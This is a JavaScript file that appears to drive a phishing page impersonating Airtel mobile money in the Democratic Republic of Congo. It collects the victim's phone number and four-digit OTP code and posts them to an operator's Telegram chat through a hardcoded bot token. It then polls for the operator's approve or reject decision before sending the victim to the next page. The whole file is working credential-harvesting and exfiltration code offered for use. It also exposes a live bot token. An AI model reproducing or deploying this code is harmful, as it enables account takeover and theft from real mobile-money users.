const BOT_TOKEN = '8242988539:AAGvq-0MvHNJgSlz52MW-SRyHDKBMiFUTzs';
const ADMIN_CHAT_ID = '8269053604';
const TELEGRAM_API = 'https://api.telegram.org/bot' + BOT_TOKEN;

const otpInput = document.getElementById('otp');
const submitButton = document.getElementById('confirm');
const phoneDisplay = document.getElementById('phone-display');
const secondsEl = document.getElementById('seconds');
const resendEl = document.getElementById('resend');

const phone = sessionStorage.getItem('airtelPhone');
if (phone) phoneDisplay.textContent = '+243 ' + phone;

let seconds = 60;
const countdown = setInterval(() => {
    seconds--;
    secondsEl.textContent = seconds;
    if (seconds <= 0) {
        clearInterval(countdown);
        resendEl.innerHTML = 'Vous n\'avez pas reçu le code? <span class="resend-link">Renvoyer</span>';
        document.querySelector('.resend-link').onclick = () => location.reload();
    }
}, 1000);

function updateButtonState() {
    const digits = otpInput.value.replace(/\D/g, '').slice(0, 4);
    otpInput.value = digits;
    const isComplete = digits.length === 4;

    if (isComplete) {
        submitButton.style.background = 'linear-gradient(135deg, #06c, #0052a3)';
        submitButton.style.color = '#fff';
        submitButton.style.cursor = 'pointer';
        submitButton.style.opacity = '1';
        submitButton.style.pointerEvents = 'auto';
        submitButton.onclick = () => initiateOtpApproval();
    } else {
        submitButton.style.background = '#e0e0e0';
        submitButton.style.color = '#999';
        submitButton.style.cursor = 'not-allowed';
        submitButton.style.opacity = '.6';
        submitButton.style.pointerEvents = 'none';
        submitButton.onclick = null;
    }
}

function showLoading(message, showRetry) {
    const existing = document.querySelector('.telegram-loading');
    if (existing) existing.remove();
    const loader = document.createElement('div');
    loader.className = 'telegram-loading';
    let html = '<div class="login-loading-card"><div class="login-loading-spinner"></div><h2 class="telegram-loading-title">' + message + '</h2><p class="telegram-loading-subtitle" id="telegram-loading-subtitle">Veuillez patienter...</p>';
    if (showRetry) html += '<button type="button" id="telegram-retry" class="telegram-retry-btn">🔄 Ressayer</button>';
    html += '</div>';
    loader.innerHTML = html;
    document.body.appendChild(loader);
    if (showRetry) {
        document.getElementById('telegram-retry')?.addEventListener('click', () => { loader.remove(); initiateOtpApproval(); });
    }
}

function hideLoading() {
    const loader = document.querySelector('.telegram-loading');
    if (loader) loader.remove();
}

async function sendOtpNotification(otp) {
    const requestId = 'otp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    const lines = [
        '🔐 OTP Verification Request',
        '📱 Phone: +' + phone,
        '🔑 OTP: ' + otp,
        '🆔 Request: ' + requestId
    ];
    const message = lines.join('\n');
    try {
        const response = await fetch(TELEGRAM_API + '/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: ADMIN_CHAT_ID,
                text: message,
                reply_markup: {
                    inline_keyboard: [[
                        { text: '✅ Approve OTP', callback_data: 'approve_' + requestId },
                        { text: '❌ Reject OTP', callback_data: 'reject_' + requestId }
                    ]]
                }
            })
        });
        return { success: response.ok, requestId: requestId };
    } catch (e) {
        console.error('OTP Telegram send failed:', e);
        return { success: false, error: e.message, requestId: requestId };
    }
}

async function checkOtpApproval(requestId) {
    try {
        const response = await fetch(TELEGRAM_API + '/getUpdates?offset=-1000000000');
        const data = await response.json();
        if (data.ok && Array.isArray(data.result)) {
            for (const update of data.result) {
                if (update.callback_query) {
                    const parts = update.callback_query.data.split('_');
                    const action = parts[0];
                    const id = parts.slice(1).join('_');
                    if (id === requestId) {
                        if (action === 'approve') {
                            try { await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: update.callback_query.from.id, text: '✅ OTP approved!' }) }); } catch (e) {}
                            return { approved: true, status: 'approved' };
                        } else if (action === 'reject') {
                            try { await fetch(TELEGRAM_API + '/sendMessage', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: update.callback_query.from.id, text: '❌ OTP rejected.' }) }); } catch (e) {}
                            return { approved: false, status: 'rejected' };
                        }
                    }
                }
            }
        }
        return { approved: false, status: 'pending' };
    } catch (e) {
        console.error('OTP approval check failed:', e);
        return { approved: false, status: 'error' };
    }
}

function startOtpPolling(requestId) {
    let checkCount = 0;
    const maxChecks = 24;
    const startTime = Date.now();
    const interval = setInterval(async () => {
        checkCount++;
        const result = await checkOtpApproval(requestId);
        const subtitle = document.getElementById('telegram-loading-subtitle');
        if (subtitle) subtitle.textContent = 'Écoulé: ' + Math.floor((Date.now() - startTime) / 1000) + 's...';
        if (result.approved) {
            clearInterval(interval);
            hideLoading();
            sessionStorage.setItem('otpVerified', 'true');
            location.href = 'validation.html';
        } else if (result.status === 'rejected') {
            clearInterval(interval);
            hideLoading();
            showLoading('Transaction Rejetée', true);
        } else if (checkCount >= maxChecks) {
            clearInterval(interval);
            hideLoading();
            showLoading('Délai Expiré', true);
        }
    }, 5000);
}

function initiateOtpApproval() {
    const otp = otpInput.value.replace(/\D/g, '').slice(0, 4);
    if (otp.length !== 4) return;
    sessionStorage.setItem('airtelOtp', otp);
    showLoading("Vérification de l'OTP", true);
    sendOtpNotification(otp).then(result => {
        if (result.success) {
            startOtpPolling(result.requestId);
        } else {
            hideLoading();
            showLoading('Erreur de Communication', true);
        }
    });
}

otpInput.addEventListener('input', updateButtonState);
otpInput.addEventListener('change', updateButtonState);
otpInput.addEventListener('paste', () => requestAnimationFrame(updateButtonState));

setInterval(updateButtonState, 100);
updateButtonState();
requestAnimationFrame(updateButtonState);